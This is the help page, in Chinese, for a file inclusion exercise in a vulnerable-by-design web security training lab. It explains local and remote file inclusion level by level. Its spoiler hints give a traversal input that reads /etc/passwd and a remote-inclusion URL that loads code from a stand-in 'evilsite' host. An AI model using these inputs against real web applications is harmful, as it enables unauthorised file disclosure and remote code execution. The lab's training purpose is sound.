<div class="body_padded">
	<h1>Help - File Inclusion</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>关于</h3>
		<p>有些Web应用程序允许用户指定直接用于文件流的输入，或允许用户将文件上载到服务器。稍后，Web应用程序访问Web应用程序上下文中用户提供的输入。通过这样做，Web应用程序允许恶意文件执行的可能性。</p>

		<p>如果选择包含的文件在目标计算机上是本地的，则称为“本地文件包含（LFI）”。但其他文件也可能包含在然后攻击是“远程文件包含（RFI）”。</p>

		<p>当不能选择RFI时。使用LFI的另一个漏洞（如文件上传和目录遍历）通常可以达到相同的效果。</p>

		<p>注意，“文件包含”一词与“任意文件访问”或“文件公开”不同。</p>

		<br /><hr /><br />

		<h3>目标</h3>
		<p>全部阅读 <u>five</u>  名言来自  '<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>'  仅使用文件包含。 </p>

		<br /><hr /><br />

		<h3>低水平</h3>
		<p> 这允许直接输入 <u> 许多PHP函数之一 </u>  这将包括执行时的内容。 </p>

		<p> 取决于Web服务的配置，将取决于是否可能存在RFI。 </p>
		<pre>扰流器: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			扰流器: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />

		<h3>中水平</h3>
		<p> 开发人员已经阅读了有关LFI/RFI的一些问题，并决定过滤输入。然而，使用的模式还不够。 </p>
		<pre>扰流器: <span class="spoiler">LFI:  可能，因为它只在模式匹配中循环一次 </span>.
			扰流器: <span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>高水平</h3>
		<p>开发商已经受够了。他们决定只允许使用某些文件。但是，由于有多个文件具有相同的基名称，它们使用通配符将它们全部包括在内。</p>
		<pre>扰流器: <span class="spoiler">LFI:  文件名只能以某个值开头。 </span>.
			扰流器: <span class="spoiler">RFI:  需要链接到另一个漏洞，如文件上传 </span>.</pre>

		<br />

		<h3>不可能的水平</h3>
		<p> 开发人员称之为退出，只对允许的页面进行硬编码，其中包含准确的文件名。通过这样做，它可以消除所有的攻击途径。 </p>
	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>参考文献: <?php echo dvwaExternalLinkUrlGet( 'https://www.owasp.org/index.php/Top_10_2007-A3' ); ?></p>

</div>
